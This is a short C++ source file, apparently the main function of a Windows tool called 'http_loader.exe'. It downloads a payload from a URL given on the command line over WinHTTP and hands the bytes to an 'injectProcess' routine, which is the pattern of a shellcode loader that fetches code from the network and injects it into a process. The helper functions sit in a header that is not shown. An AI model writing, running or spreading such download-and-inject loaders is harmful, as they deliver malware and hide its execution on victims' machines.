#include "header.h"
#pragma comment(lib, "winhttp.lib")


int main(int argc, char* argv[]) {

    if (argc < 2) {
        std::cerr << "Usage: .\\http_loader.exe http://127.0.0.1/payload.bin\n";
       return 1;
   }

    URL format{argv[1]};
    formatURL(format);
  
    std::vector<BYTE> buffer = makeRequest(format);
    injectProcess(buffer);
}

